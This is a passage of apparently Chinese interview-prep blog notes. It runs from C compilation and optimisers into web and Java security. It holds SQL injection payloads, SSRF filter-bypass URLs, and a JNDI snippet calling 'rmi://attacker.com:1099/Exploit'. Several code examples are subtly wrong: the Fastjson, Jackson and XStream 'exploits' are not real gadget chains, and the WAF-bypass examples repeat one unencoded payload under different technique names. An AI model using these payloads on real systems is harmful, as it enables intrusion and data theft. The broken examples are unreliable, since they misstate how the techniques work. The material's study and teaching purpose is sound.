eax, dword [rbp-12]</span><br><span class="line">    mov esi, eax</span><br><span class="line">    mov edi, offset .LC0</span><br><span class="line">    call printf</span><br><span class="line">    nop</span><br><span class="line">    leave</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>

<h3 id="4-程序的编译和链接"><a href="#4-程序的编译和链接" class="headerlink" title="4. 程序的编译和链接"></a>4. 程序的编译和链接</h3><h4 id="编译过程："><a href="#编译过程：" class="headerlink" title="编译过程："></a>编译过程：</h4><ol>
<li><strong>预处理</strong>：处理头文件和宏定义。</li>
<li><strong>编译</strong>：将预处理后的代码编译为汇编代码。</li>
<li><strong>汇编</strong>：将汇编代码转换为机器码。</li>
<li><strong>链接</strong>：将多个目标文件链接成一个可执行文件。</li>
</ol>
<h4 id="示例代码：-3"><a href="#示例代码：-3" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;example.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    example_function();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// example.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> EXAMPLE_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXAMPLE_H</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">example_function</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// example.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">example_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from example_function!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="编译和链接命令："><a href="#编译和链接命令：" class="headerlink" title="编译和链接命令："></a>编译和链接命令：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -c main.c -o main.o</span><br><span class="line">gcc -c example.c -o example.o</span><br><span class="line">gcc main.o example.o -o program</span><br></pre></td></tr></table></figure>

<h4 id="编译原理："><a href="#编译原理：" class="headerlink" title="编译原理："></a>编译原理：</h4><ul>
<li><strong>预处理</strong>：展开头文件和宏。</li>
<li><strong>编译</strong>：将C代码转换为汇编代码。</li>
<li><strong>汇编</strong>：将汇编代码转换为机器码。</li>
<li><strong>链接</strong>：将多个目标文件合并为一个可执行文件。</li>
</ul>
<h4 id="If-Else语法树："><a href="#If-Else语法树：" class="headerlink" title="If&#x2F;Else语法树："></a>If&#x2F;Else语法树：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">If-Else Statement</span><br><span class="line">├── Condition: (a &gt; 5)</span><br><span class="line">├── Then Block:</span><br><span class="line">│   └── Print: &quot;a is greater than 5&quot;</span><br><span class="line">└── Else Block:</span><br><span class="line">    └── Print: &quot;a is less than or equal to 5&quot;</span><br></pre></td></tr></table></figure>

<h3 id="5-Linux-proc目录和查看进程打开的文件"><a href="#5-Linux-proc目录和查看进程打开的文件" class="headerlink" title="5. Linux &#x2F;proc目录和查看进程打开的文件"></a>5. Linux &#x2F;proc目录和查看进程打开的文件</h3><h4 id="查看进程打开的文件："><a href="#查看进程打开的文件：" class="headerlink" title="查看进程打开的文件："></a>查看进程打开的文件：</h4><ol>
<li><p><strong>通过&#x2F;proc&#x2F;[pid]&#x2F;fd目录</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /proc/[pid]/fd</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用lsof命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -p [pid]</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="示例代码：-4"><a href="#示例代码：-4" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前进程的打开文件</span></span><br><span class="line"><span class="built_in">ls</span> -l /proc/self/fd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看特定进程的打开文件</span></span><br><span class="line">lsof -p 1234</span><br></pre></td></tr></table></figure>

<h3 id="6-SGD和Adam的区别"><a href="#6-SGD和Adam的区别" class="headerlink" title="6. SGD和Adam的区别"></a>6. SGD和Adam的区别</h3><h4 id="SGD（随机梯度下降）："><a href="#SGD（随机梯度下降）：" class="headerlink" title="SGD（随机梯度下降）："></a>SGD（随机梯度下降）：</h4><ul>
<li><strong>原理</strong>：每次更新参数时，使用单个样本的梯度。</li>
<li><strong>优点</strong>：计算效率高，适合大规模数据。</li>
<li><strong>缺点</strong>：收敛速度较慢，容易陷入局部最优。</li>
</ul>
<h4 id="Adam（Adaptive-Moment-Estimation）："><a href="#Adam（Adaptive-Moment-Estimation）：" class="headerlink" title="Adam（Adaptive Moment Estimation）："></a>Adam（Adaptive Moment Estimation）：</h4><ul>
<li><strong>原理</strong>：结合动量和自适应学习率的方法。</li>
<li><strong>优点</strong>：收敛速度快，适合非凸优化问题。</li>
<li><strong>缺点</strong>：参数较多，需要调优。</li>
</ul>
<h4 id="示例代码（PyTorch）："><a href="#示例代码（PyTorch）：" class="headerlink" title="示例代码（PyTorch）："></a>示例代码（PyTorch）：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义模型</span></span><br><span class="line">model = nn.Linear(<span class="number">10</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用SGD优化器</span></span><br><span class="line">sgd_optimizer = optim.SGD(model.parameters(), lr=<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用Adam优化器</span></span><br><span class="line">adam_optimizer = optim.Adam(model.parameters(), lr=<span class="number">0.001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 损失函数</span></span><br><span class="line">criterion = nn.MSELoss()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟训练</span></span><br><span class="line">inputs = torch.randn(<span class="number">100</span>, <span class="number">10</span>)</span><br><span class="line">targets = torch.randn(<span class="number">100</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="comment"># 前向传播</span></span><br><span class="line">    outputs = model(inputs)</span><br><span class="line">    loss = criterion(outputs, targets)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 反向传播和优化（SGD）</span></span><br><span class="line">    sgd_optimizer.zero_grad()</span><br><span class="line">    loss.backward()</span><br><span class="line">    sgd_optimizer.step()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 反向传播和优化（Adam）</span></span><br><span class="line">    adam_optimizer.zero_grad()</span><br><span class="line">    loss.backward()</span><br><span class="line">    adam_optimizer.step()</span><br></pre></td></tr></table></figure>

<h4 id="Adam更新规则："><a href="#Adam更新规则：" class="headerlink" title="Adam更新规则："></a>Adam更新规则：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Adam更新规则的伪代码</span></span><br><span class="line">m = beta1 * m + (<span class="number">1</span> - beta1) * g</span><br><span class="line">v = beta2 * v + (<span class="number">1</span> - beta2) * (g ** <span class="number">2</span>)</span><br><span class="line">m_hat = m / (<span class="number">1</span> - beta1 ** t)</span><br><span class="line">v_hat = v / (<span class="number">1</span> - beta2 ** t)</span><br><span class="line">theta = theta - lr * m_hat / (torch.sqrt(v_hat) + epsilon)</span><br></pre></td></tr></table></figure>

<h3 id="Java反序列化原理和工具"><a href="#Java反序列化原理和工具" class="headerlink" title="Java反序列化原理和工具"></a>Java反序列化原理和工具</h3><p>Java反序列化是将字节流转换为Java对象的过程。反序列化漏洞通常发生在未验证的输入被反序列化时，可能导致远程代码执行。常见的反序列化工具包括<code>ysoserial</code>，用于生成恶意的序列化对象。</p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(<span class="keyword">new</span> <span class="title class_">SerializableClass</span>());</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>));</span><br><span class="line">        <span class="type">SerializableClass</span> <span class="variable">obj</span> <span class="operator">=</span> (SerializableClass) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SerializableClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Shiro反序列化工具的原理"><a href="#Shiro反序列化工具的原理" class="headerlink" title="Shiro反序列化工具的原理"></a>Shiro反序列化工具的原理</h3><p>Apache Shiro是一个Java安全框架，其反序列化漏洞（如CVE-2016-4437）通常与<code>rememberMe</code>功能有关。攻击者可以通过构造恶意的序列化对象，触发反序列化漏洞，执行任意代码。工具如<code>ShiroExploit</code>利用了Shiro的<code>rememberMe</code>功能，生成恶意的Cookie值，用于攻击。</p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">cipher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;your-secret-key&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;malicious-payload&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encrypted</span> <span class="operator">=</span> cipher.encrypt(payload.getBytes(), key.getBytes()).toBase64();</span><br><span class="line">        System.out.println(<span class="string">&quot;RememberMe: &quot;</span> + encrypted);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="安全研究员"><a href="#安全研究员" class="headerlink" title="安全研究员"></a>安全研究员</h2><h3 id="SSRF的绕过和防御"><a href="#SSRF的绕过和防御" class="headerlink" title="SSRF的绕过和防御"></a>SSRF的绕过和防御</h3><h4 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a><strong>SSRF绕过</strong></h4><ol>
<li><p><strong>URL黑名单绕过</strong>：</p>
<ul>
<li>使用IP的十进制或八进制表示（如<code>127.0.0.1</code>可以表示为<code>2130706433</code>或<code>017700000001</code>）。</li>
<li>使用URL编码或大小写变体对敏感字符串进行模糊处理。</li>
<li>注册一个解析到目标IP的域名（如<code>spoofed.burpcollaborator.net</code>）来绕过过滤。</li>
</ul>
</li>
<li><p><strong>URL白名单绕过</strong>：</p>
<ul>
<li>利用<code>@</code>符号进行HTTP基本身份认证，例如<code>http://expected-host:fakepassword@evil-host</code>。</li>
<li>使用<code>#</code>符号的片段标识符，例如<code>http://evil-host#expected-host</code>。</li>
<li>利用DNS命名层次结构，例如<code>http://expected-host.evil-host</code>。</li>
</ul>
</li>
<li><p><strong>URL重定向绕过</strong>：</p>
<ul>
<li>利用开放重定向漏洞，例如构造一个满足过滤器的URL，然后通过重定向访问目标地址。</li>
</ul>
</li>
<li><p><strong>DNS重绑定绕过</strong>：</p>
<ul>
<li>配置一个自定义的恶意DNS服务器，设置TTL为0，使域名解析在合法和非法IP之间切换。</li>
</ul>
</li>
</ol>
<h4 id="SSRF防御"><a href="#SSRF防御" class="headerlink" title="SSRF防御"></a><strong>SSRF防御</strong></h4><ol>
<li><p><strong>严格的输入验证</strong>：</p>
<ul>
<li>仅允许访问预定义的白名单主机和端口，禁止内网IP、localhost、特殊协议（如<code>file</code>、<code>gopher</code>等）。</li>
<li>禁用高危协议，仅允许HTTP&#x2F;HTTPS。</li>
</ul>
</li>
<li><p><strong>限制请求范围</strong>：</p>
<ul>
<li>使用防火墙规则限制服务器对外部网络的访问权限。</li>
</ul>
</li>
<li><p><strong>随机令牌验证</strong>：</p>
<ul>
<li>对需要发起服务器端请求的操作，增加随机令牌作为请求的一部分。</li>
</ul>
</li>
<li><p><strong>回源限制</strong>：</p>
<ul>
<li>设置正确的回源策略，避免因回源请求暴露内网。</li>
</ul>
</li>
</ol>
<h3 id="Fastjson和Jackson反序列化原理"><a href="#Fastjson和Jackson反序列化原理" class="headerlink" title="Fastjson和Jackson反序列化原理"></a>Fastjson和Jackson反序列化原理</h3><h4 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a><strong>Fastjson</strong></h4><p>Fastjson通过<code>JSON.parseObject</code>方法将JSON字符串反序列化为Java对象。其核心机制是：</p>
<ol>
<li><strong>动态类加载</strong>：通过<code>Class.forName</code>动态加载类。</li>
<li><strong>反射调用</strong>：使用反射调用类的构造方法或<code>set</code>方法设置属性值。</li>
<li><strong>漏洞利用</strong>：攻击者可以利用<code>@Type</code>注解指定恶意类，触发反序列化漏洞。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;,\&quot;exec\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload, Object.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Jackson"><a href="#Jackson" class="headerlink" title="Jackson"></a><strong>Jackson</strong></h4><p>Jackson通过<code>ObjectMapper</code>类将JSON字符串反序列化为Java对象。其核心机制是：</p>
<ol>
<li><strong>类型解析</strong>：通过<code>@JsonTypeInfo</code>注解指定类型信息。</li>
<li><strong>反射调用</strong>：使用反射调用类的构造方法或<code>set</code>方法设置属性值。</li>
<li><strong>漏洞利用</strong>：攻击者可以利用<code>@JsonTypeInfo</code>注解指定恶意类，触发反序列化漏洞。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;,\&quot;exec\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.readValue(payload, Object.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="BCEL可以用其他类加载器吗"><a href="#BCEL可以用其他类加载器吗" class="headerlink" title="BCEL可以用其他类加载器吗"></a>BCEL可以用其他类加载器吗</h3><p>BCEL（Byte Code Engineering Library）可以动态生成和操作Java字节码。通过自定义类加载器，可以加载生成的字节码，从而绕过默认类加载器的限制。例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.bcel.classfile.ClassParser;</span><br><span class="line"><span class="keyword">import</span> org.apache.bcel.classfile.JavaClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(<span class="type">byte</span>[] bytecode) &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, bytecode, <span class="number">0</span>, bytecode.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="XStream反序列化"><a href="#XStream反序列化" class="headerlink" title="XStream反序列化"></a>XStream反序列化</h3><p>XStream通过<code>fromXML</code>方法将XML字符串反序列化为Java对象。其核心机制是：</p>
<ol>
<li><strong>类型解析</strong>：通过<code>&lt;object-type&gt;</code>标签指定类类型。</li>
<li><strong>反射调用</strong>：使用反射调用类的构造方法或<code>set</code>方法设置属性值。</li>
<li><strong>漏洞利用</strong>：攻击者可以指定恶意类，触发反序列化漏洞。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XStreamExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&lt;java.lang.Runtime&gt;&lt;exec&gt;calc&lt;/exec&gt;&lt;/java.lang.Runtime&gt;&quot;</span>;</span><br><span class="line">        xstream.fromXML(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RMI原理以及相关漏洞"><a href="#RMI原理以及相关漏洞" class="headerlink" title="RMI原理以及相关漏洞"></a>RMI原理以及相关漏洞</h3><h4 id="RMI原理"><a href="#RMI原理" class="headerlink" title="RMI原理"></a><strong>RMI原理</strong></h4><p>RMI（Remote Method Invocation）允许Java对象在不同JVM之间调用方法。其工作流程包括：</p>
<ol>
<li><strong>注册服务</strong>：通过<code>RMIRegistry</code>注册服务。</li>
<li><strong>远程调用</strong>：客户端通过<code>Naming.lookup</code>获取远程对象的引用。</li>
<li><strong>方法调用</strong>：客户端调用远程对象的方法，参数和返回值通过序列化传递。</li>
</ol>
<h4 id="RMI漏洞"><a href="#RMI漏洞" class="headerlink" title="RMI漏洞"></a><strong>RMI漏洞</strong></h4><ol>
<li><strong>未授权访问</strong>：未对远程方法调用进行身份验证。</li>
<li><strong>反序列化漏洞</strong>：攻击者可以通过恶意序列化数据触发反序列化漏洞。</li>
<li><strong>防御措施</strong>：<ul>
<li>使用身份验证机制。</li>
<li>禁用不必要的RMI服务。</li>
<li>使用防火墙限制RMI服务的访问。</li>
</ul>
</li>
</ol>
<h3 id="JdbcRowSetImpl如何触发JNDI注入"><a href="#JdbcRowSetImpl如何触发JNDI注入" class="headerlink" title="JdbcRowSetImpl如何触发JNDI注入"></a>JdbcRowSetImpl如何触发JNDI注入</h3><p><code>JdbcRowSetImpl</code>通过<code>setDataSourceName</code>方法设置数据源名称，如果数据源名称包含JNDI引用，则会触发JNDI注入。例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.sql.rowset.JdbcRowSet;</span><br><span class="line"><span class="keyword">import</span> javax.sql.rowset.RowSetProvider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSet</span> <span class="variable">jrs</span> <span class="operator">=</span> RowSetProvider.newFactory().createJdbcRowSet();</span><br><span class="line">        jrs.setDataSourceName(<span class="string">&quot;rmi://attacker.com:1099/Exploit&quot;</span>);</span><br><span class="line">        jrs.setCommand(<span class="string">&quot;SELECT * FROM users&quot;</span>);</span><br><span class="line">        jrs.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="长亭科技"><a href="#长亭科技" class="headerlink" title="长亭科技"></a>长亭科技</h2><h3 id="MySQL-报错注入常用的函数"><a href="#MySQL-报错注入常用的函数" class="headerlink" title="MySQL 报错注入常用的函数"></a>MySQL 报错注入常用的函数</h3><ol>
<li><p>**floor()**：</p>
<ul>
<li><strong>原理</strong>：通过 <code>floor(rand(0)*2)</code> 的重复性，导致 <code>group by</code> 语句出错。</li>
<li><strong>payload</strong>：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;union select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a--</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>**extractvalue()**：</p>
<ul>
<li><strong>原理</strong>：通过不符合 XPath 语法的字符串触发错误。</li>
<li><strong>payload</strong>：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))--</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>**updatexml()**：</p>
<ul>
<li><strong>原理</strong>：与 <code>extractvalue()</code> 类似，通过不符合 XPath 语法的字符串触发错误。</li>
<li><strong>payload</strong>：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))--</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="报错注入绕过-WAF"><a href="#报错注入绕过-WAF" class="headerlink" title="报错注入绕过 WAF"></a>报错注入绕过 WAF</h3><ol>
<li><p><strong>编码混淆</strong>：</p>
<ul>
<li>使用 URL 编码或 Unicode 编码绕过 WAF 检测。</li>
<li>示例：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))--</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>拆分查询</strong>：</p>
<ul>
<li>将 SQL 查询拆分为多个部分，分别注入，最后组合成完整的查询。</li>
<li>示例：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))--</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>协议特性</strong>：</p>
<ul>
<li>利用 HTTP 头或 Cookie 参数注入 SQL 代码。</li>
<li>示例：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))--</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="MySQL-写文件的函数"><a href="#MySQL-写文件的函数" class="headerlink" title="MySQL 写文件的函数"></a>MySQL 写文件的函数</h3><ol>
<li><p><strong>INTO OUTFILE</strong>：</p>
<ul>
<li>用于将查询结果写入文件。</li>
<li><strong>限制</strong>：<ul>
<li>需要 <code>FILE</code> 权限。</li>
<li>文件必须位于 MySQL 服务器的文件系统上。</li>
<li>文件路径必须是绝对路径。</li>
